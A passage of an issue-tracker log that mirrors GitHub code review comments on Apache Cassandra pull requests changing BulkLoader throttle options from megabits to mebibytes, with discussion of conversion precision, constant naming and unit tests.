         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   `idctib` and `eidctmib` sound a bit long but they follow the already established naming convention and when people know where it comes from I guess it will be intuitive. 



;22/Jun/22 18:26;githubbot;600","frankgh commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r904110789


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -653,10 +653,10 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001)"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MEGABITS, ""throttle"", ""throttle speed in Mbps (default unlimited)"");
+        options.addOption(""idct"", INTER_DC_THROTTLE_MEGABITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbps (default unlimited)"");
+        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MEBIBYTES, ""entire-sstable-throttle"", ""entire SSTable throttle speed in MiB/s (default unlimited)"");
+        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in MiB/s (default unlimited)"");

Review Comment:
   I pushed the changes above. Let me know what you think



;22/Jun/22 18:35;githubbot;600","frankgh opened a new pull request, #1701:
URL: https://github.com/apache/cassandra/pull/1701

   `entire_sstable_stream_throughput_outbound` and `entire_sstable_inter_dc_stream_throughput_outbound` were
   introduced in CASSANDRA-17065. They were added to the LoaderOptions class but they are not being used in
   the BulkLoader class. In this commit, we make use of the entire_sstable streaming options in BulkLoader.
   In addittion, the `throttle` and `interDcThrottle` are being passed as MB/s but they should be MiB/s.
   This commit fixes the verbiage as well as setting the correct value for those properties in BulkLoader.


;22/Jun/22 19:36;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r905265410


##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle"", ""200"", ""--inter-dc-throttle"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-tmib"", ""200"", ""-idctmib"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes

Review Comment:
   ```suggestion
           // converts from megabits to mebibytes
   ```



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle"", ""200"", ""--inter-dc-throttle"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes

Review Comment:
   ```suggestion
           // converts from megabits to mebibytes
   ```



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle"", ""200"", ""--inter-dc-throttle"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-tmib"", ""200"", ""-idctmib"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(200, options.throttleMebibytes);
+        assertEquals(400, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle-mib"", ""200"", ""--inter-dc-throttle-mib"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes

Review Comment:
   ```suggestion
           // converts from megabits to mebibytes
   ```



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,46 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMebibytes = DataRateSpec.IntMebibytesPerSecondBound.megabitsPerSecondInMebibytesPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS)))
+                                                                               .toMebibytesPerSecondAsInt();

Review Comment:
   I think that this part has an issue and breaks the compatibility. The conversions between megabits and mebibytes are double numbers internally. Something very annoying to keep backward compatibility, etc. 
   So the issue with this approach here is that someone will set megabits but by using `.toMebibytesPerSecondAsInt()` to set the throttling we actually round the number. This can be caught if you try to add  `--throttle` being `5megabits` in `testBulkLoader_WithArgs6`. Then if you do `assertEquals(5, DatabaseDescriptor.getStreamThroughputOutboundMegabitsPerSec());` you actually get 8. 
   As it is a tool and the difference doesn't seem super big might be ok. 
   The bad part is that if someone tries super small number just for testing or something, they will actually get 0 and unthrottle... That is how I identified that annoying issue when we worked on the new config framework and we switched to `double` in DataRateSpec to be precise as the `RateLimiter` gets double anyway. At the same time, of course, we do not allow the users to input `double` numbers, just `int`. The `SetGetStreamThroughputTest` tests small numbers but we didn't have this for the tool and it is very tiny detail easy to miss. :-( 
   I am thinking maybe we can introduce double variable to ensure precision and no surprises to people who continue using the megabits version? WDYT?
   In general probably we can just document for people this behavior and leave it as is I guess but if we want to keep the compatibility and be precise everywhere, we will need to introduce `double`. I guess this shouldn't be hard so at this point of the release I guess I would prefer just to work our the precision to be correct.
   
   CC @yifan-c 



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle"", ""200"", ""--inter-dc-throttle"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);

Review Comment:
   After we fix the precision issue, I think it will be correct to check the megabits here



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,46 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }

Review Comment:
   Good call! :-)



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes

Review Comment:
   ```suggestion
           // converts from megabits to mebibytes
   ```



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabytes to mebibytes
+        assertEquals(24, options.throttleMebibytes);
+        assertEquals(48, options.interDcThrottleMebibytes);
+    }

Review Comment:
   After we fix the precision issue, I think it will be correct to check the megabits here



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);

Review Comment:
   nit: shall we add assertions also for the other two? 



;23/Jun/22 18:36;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r905577755


##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);

Review Comment:
   we have another test for entire sstable default settings `testEntireSSTableDefaultSettings`. Do we want to combine them?



;23/Jun/22 23:15;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r905581189


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,46 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMebibytes = DataRateSpec.IntMebibytesPerSecondBound.megabitsPerSecondInMebibytesPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS)))
+                                                                               .toMebibytesPerSecondAsInt();

Review Comment:
   let me think about this. I have some ideas, but one of the options is to use a `double` type instead of `int`. Another idea is to keep two variables, one for mibs and one for MiBs. I will probably end up going with the solution that produces the more accurate result in the tests.



;23/Jun/22 23:24;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r905603919


##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -84,38 +84,158 @@ public void testEncryptionSettings() throws Exception
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMebibytes);
+        assertEquals(0, options.interDcThrottleMebibytes);

Review Comment:
   Sorry, I missed that one it seems. Maybe we can just combine them, it's up to you. 



;24/Jun/22 00:04;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r905605264


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,46 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMebibytes = DataRateSpec.IntMebibytesPerSecondBound.megabitsPerSecondInMebibytesPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS)))
+                                                                               .toMebibytesPerSecondAsInt();

Review Comment:
   As long as the user sees only ints and input match output - I am good :-) Probably both versions should work



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,46 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMebibytes = DataRateSpec.IntMebibytesPerSecondBound.megabitsPerSecondInMebibytesPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS)))
+                                                                               .toMebibytesPerSecondAsInt();

Review Comment:
   As long as the user sees only ints and input matches output - I am good :-) Probably both versions should work



;24/Jun/22 00:08;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906262212


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   I made these conversions more explicit, let me know if this is okay @ekaterinadimitrova2 



;24/Jun/22 17:26;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906263218


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -395,7 +395,7 @@ public double convert(double source, DataRateUnit sourceUnit)
         };
 
         static final double MAX = Long.MAX_VALUE;
-        static final double MEGABITS_PER_MEBIBYTE = 8.388608;
+        static final double MEGABITS_PER_MEBIBYTE = 131_072D / 15_625D;

Review Comment:
   another explicit conversion



;24/Jun/22 17:28;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906372158


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   It is hard to see the reasoning behind the equations.
   
   How about define the constants for MEGABIT, MEBIBYTES, etc. in bits and derive the conversion from the constants? For example,
   
   ```java
   static final double MEBIBYTES_IN_BITS = Math.pow(2, 20) * 8;
   static final double MEGABIT_IN_BITS = Math.pow(10, 6); 
   static final double MEBIBYTES_PER_MEGABIT = MEGABIT_IN_BITS / MEBIBYTES_IN_BITS;
   ... more for the other size units...
   ```
   



;24/Jun/22 20:04;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906380097


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   good point, I've updated the PR. The only difference is that I've defined `MEBIBYTES_IN_BITS` as:
   ```java
   static final double MEBIBYTES_IN_BITS = Math.pow(2, 20) * 8;
   ```



##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   good point, I've updated the PR. The only difference is that I've defined `MEBIBYTES_IN_BITS` as:
   ```java
   static final double MEBIBYTES_IN_BITS = Math.pow(2, 23);
   ```



;24/Jun/22 20:19;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906437371


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -38,6 +38,10 @@
      * The Regexp used to parse the rate provided as String in cassandra.yaml.
      */
     private static final Pattern UNITS_PATTERN = Pattern.compile(""^(\\d+)(MiB/s|KiB/s|B/s)$"");
+    static final double MEBIBYTES_IN_BITS = Math.pow(2, 23);

Review Comment:
   ```suggestion
       static final double MEBIBYTE_IN_BITS = Math.pow(2, 23);
   ```



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   I am wondering whether we should also add builder methods for the mebibytes version we added? 
   Also, considering all latest discussions around tools, are we allowed change the names of these Builder methods? Maybe better to deprecate the old name and point to the new ones?
   Something like: 
   ```
   public Builder throttleMegabits(int throttleMegabits)
           {
               this.throttleMegabits = throttleMegabits;
               return this;
           }
   
           
           @Deprecated 
           public Builder throttle(int throttle)
           {
               return throttleMegabits(throttle);
           }
   ```



##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -2024,7 +2024,12 @@ public static double getStreamThroughputOutboundMebibytesPerSec()
         return conf.stream_throughput_outbound.toMebibytesPerSecond();
     }
 
-    public static void setStreamThroughputOutboundMegabitsPerSec(int value)
+    public static int getStreamThroughputOutboundMebibytesPerSecAsInt()
+    {
+        return conf.stream_throughput_outbound.toMebibytesPerSecondAsInt();
+    }
+
+    public static void setStreamThroughputOutboundMegabitsPerSec(long value)

Review Comment:
   I think value should stay `int`



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,44 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMegabits = Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS));
+                }
+
+                if (cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
